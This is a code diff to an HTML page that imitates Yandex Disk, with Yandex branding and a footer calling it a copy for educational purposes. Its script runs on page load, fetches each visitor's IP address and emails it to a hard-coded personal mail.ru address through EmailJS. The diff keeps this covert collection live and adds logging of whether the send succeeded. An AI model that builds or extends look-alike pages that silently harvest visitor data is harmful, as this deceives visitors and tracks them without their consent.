@@ -8,7 +8,7 @@
 <body>
   <header class="header">
     <span class="logo">
-      <img src="https://yastatic.net/s3/home-static/_/f/360-logo-plus.svg" alt="360" height="32" style="vertical-align:middle">
+      <img src="https://yastatic.net/s3/home-static/_/f/360-logo-plus.svg" alt="360" height="32">
     </span>
     <input class="search" type="text" placeholder="Поиск на моём диске"/>
     <nav class="topmenu">
@@ -63,11 +63,11 @@
     <span>© 2012–2025 «Яндекс» — Копия для учебных целей</span>
   </footer>
 
-  <!-- EmailJS: отправка IP посетителя на почту -->
+  <!-- EmailJS: отправка IP на почту -->
   <script src="https://cdn.emailjs.com/sdk/3.6.2/email.min.js"></script>
   <script>
     (function(){
-      emailjs.init("jtFypg4wkHBQ4RdUQ"); // Вставь сюда свой User ID/Public Key от EmailJS
+      emailjs.init("jtFypg4wkHBQ4RdUQ");
     })();
 
     window.onload = function() {
@@ -78,9 +78,14 @@
             ip: data.ip,
             date: new Date().toLocaleString(),
             email_to: "nikita.donn@mail.ru"
+          })
+          .then(function(response) {
+            console.log('Email sent!', response.status, response.text);
+          }, function(error) {
+            console.error('EmailJS error:', error);
           });
         });
-    }
+    };
   </script>
 </body>
 </html>
